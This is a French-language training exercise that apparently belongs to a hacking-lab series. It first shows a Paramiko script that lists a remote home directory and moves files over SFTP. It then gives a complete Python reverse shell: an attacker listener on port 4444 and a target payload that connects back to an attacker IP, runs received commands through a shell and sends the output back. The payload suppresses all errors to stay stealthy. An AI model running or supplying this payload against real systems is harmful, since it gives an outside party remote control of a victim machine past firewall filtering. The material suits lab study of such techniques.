# Quête 17 : Prise de Contrôle, Transfert de Fichiers et Reverse Shell

## Objectifs de la quête
- [x] Développer un script de contrôle à distance (SSH) pour lister le répertoire `/home`.
- [x] Implémenter le transfert de fichiers (Upload/Download) via SFTP.
- [x] Réaliser un **Reverse Shell** (Shell inversé) pour contourner les restrictions réseau.

---

## Partie 1 : Administration et Transfert de Fichiers (Paramiko)

Pour la gestion de fichiers et l'exécution de commandes propres, nous utilisons **Paramiko**, une implémentation Python du protocole SSHv2. C'est plus puissant que `spur` (vu précédemment) car cela gère nativement le SFTP (Secure File Transfer Protocol).

### Installation
```bash
pip install paramiko
Le Script : Gestionnaire SSH (ssh_manager.py)
Ce script se connecte, liste le dossier /home de la cible, envoie un fichier local et en télécharge un distant.

Python
import paramiko
import os

def remote_admin_actions():
    # Configuration
    host = "192.168.1.25"  # IP de la Cible
    user = "user"          # Utilisateur Cible
    password = "password123"
    
    # Fichiers de test
    local_file = "ordre_mission.txt"
    remote_file_path = f"/home/{user}/rapport_secret.txt"

    # Création d'un fichier local pour le test
    with open(local_file, "w") as f:
        f.write("Ceci est un fichier envoyé depuis le QG.")

    print(f"--- Connexion SSH vers {host} ---")
    
    try:
        # 1. Connexion SSH
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=user, password=password)
        
        # 2. Ouverture session SFTP (Pour le transfert de fichiers)
        sftp = client.open_sftp()
        print("[+] Session SFTP ouverte.")

        # 3. Lister le répertoire /home
        print(f"\n[*] Contenu du dossier /home/{user} :")
        files = sftp.listdir(f"/home/{user}")
        for f in files:
            print(f"    - {f}")

        # 4. Transfert Vers la Cible (Upload)
        print(f"\n[*] Envoi du fichier '{local_file}' vers la cible...")
        sftp.put(local_file, f"/home/{user}/{local_file}")
        print("    -> Upload réussi.")

        # 5. Transfert Depuis la Cible (Download)
        # On essaie de télécharger un fichier (ou celui qu'on vient d'envoyer pour tester)
        print(f"\n[*] Téléchargement de '{local_file}' depuis la cible (renommé en 'recu.txt')...")
        sftp.get(f"/home/{user}/{local_file}", "recu_de_la_cible.txt")
        print("    -> Download réussi.")

        sftp.close()
        client.close()
        print("\n[+] Fin de la session d'administration.")

    except Exception as e:
        print(f"[!] Erreur : {e}")

if __name__ == "__main__":
    remote_admin_actions()
Partie 2 : Le Reverse Shell
Un Reverse Shell est une technique où la machine cible (la victime) initie la connexion vers la machine de l'attaquant.

Bind Shell (Classique) : L'attaquant se connecte à la cible (bloqué souvent par le Pare-feu de la cible).

Reverse Shell : La cible se connecte à l'attaquant (autorisé souvent car le trafic sortant est moins filtré).

Script A : L'Attaquant (Serveur d'écoute)
Ce script tourne sur VOTRE machine. Il attend que la cible se connecte.

Fichier : attacker_listener.py

Python
import socket

def start_listener():
    # Écoute sur toutes les interfaces, port 4444
    host = "0.0.0.0"
    port = 4444

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    
    print(f"[*] En écoute sur {port} waiting for reverse connection...")
    
    client, addr = s.accept()
    print(f"[+] Connexion reçue de {addr} ! Vous avez le contrôle.")

    while True:
        # 1. Entrer la commande
        command = input(f"Shell@{addr[0]}:~# ")
        
        if command.lower() == "exit":
            client.send(b"exit")
            break
        
        if command.strip() == "":
            continue

        # 2. Envoyer la commande à la victime
        client.send(command.encode("utf-8"))
        
        # 3. Recevoir le résultat (buffer large pour ls -la etc)
        output = client.recv(4096).decode("utf-8")
        print(output)

    client.close()
    s.close()

if __name__ == "__main__":
    start_listener()
Script B : La Cible (Payload)
Ce script est exécuté sur la MACHINE DISTANTE.

Fichier : target_payload.py

Python
import socket
import subprocess
import os
import sys

def reverse_shell():
    # IP de l'ATTAQUANT (Changez ceci par l'IP de votre machine hôte)
    attacker_ip = "192.168.1.10" 
    attacker_port = 4444

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))

        # Redirection des flux (Optionnel, ici on fait une boucle manuelle pour compatibilité Windows/Linux)
        while True:
            # 1. Recevoir l'ordre
            command = s.recv(1024).decode("utf-8")

            if command.lower() == "exit":
                break
            
            # 2. Exécuter la commande système
            # CD est un cas particulier (commande interne shell)
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    s.send(b"Changement de repertoire OK")
                except FileNotFoundError:
                    s.send(b"Erreur: Dossier introuvable")
                continue

            # Exécution standard
            proc = subprocess.Popen(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                stdin=subprocess.PIPE
            )
            
            output, error = proc.communicate()

            # 3. Renvoyer le résultat
            result = output + error
            if not result:
                result = b"[Action effectuee]"
            
            s.send(result)

        s.close()
    except Exception as e:
        # En mode furtif, on ne print rien sur la cible
        pass

if __name__ == "__main__":
    reverse_shell()
Mise en Pratique
Lancer l'écoute : Sur votre machine, lancez python3 attacker_listener.py.

Lancer la charge : Sur la VM cible, lancez python3 target_payload.py.

Observation :

Sur votre machine attaquant, vous verrez : [+] Connexion reçue de ....

Tapez ls (ou dir sous Windows) : vous verrez les fichiers de la cible s'afficher sur votre écran.

Tapez whoami pour voir quel utilisateur vous contrôlez.